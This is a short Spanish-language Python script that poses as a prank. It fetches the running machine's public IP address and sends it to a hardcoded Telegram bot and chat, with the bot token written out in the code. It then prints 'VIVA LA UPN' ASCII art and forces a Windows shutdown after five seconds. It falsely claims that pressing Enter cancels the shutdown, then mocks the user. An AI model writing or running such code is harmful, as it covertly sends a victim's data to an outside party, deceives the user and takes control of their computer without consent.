import os
import telegram

bot_token = '5689750548:AAHMDwwtLC6_ylkraqLHMO5Bt85HxJRqRF0'
chat_id = '1850445278'
bot = telegram.Bot(token=bot_token)

ip =get("https://api.ipify.org/").text
#print("your ip :", ip)
bot.send_message(chat_id=chat_id, text = "Apagando pc pipipi: "+ ip)

print("██╗░░░██╗██╗██╗░░░██╗░█████╗░  ██╗░░░░░░█████╗░  ██╗░░░██╗██████╗░███╗░░██╗")
print("██║░░░██║██║██║░░░██║██╔══██╗  ██║░░░░░██╔══██╗  ██║░░░██║██╔══██╗████╗░██║")
print("╚██╗░██╔╝██║╚██╗░██╔╝███████║  ██║░░░░░███████║  ██║░░░██║██████╔╝██╔██╗██║")
print("░╚████╔╝░██║░╚████╔╝░██╔══██║  ██║░░░░░██╔══██║  ██║░░░██║██╔═══╝░██║╚████║")
print("░░╚██╔╝░░██║░░╚██╔╝░░██║░░██║  ███████╗██║░░██║  ╚██████╔╝██║░░░░░██║░╚███║")
print("░░░╚═╝░░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝  ╚══════╝╚═╝░░╚═╝  ░╚═════╝░╚═╝░░░░░╚═╝░░╚══╝")

os.system("shutdown /s /t 5")

input("Presione Enter para CANCELAR")
print("Mentira, igual se apagara XD ")
input()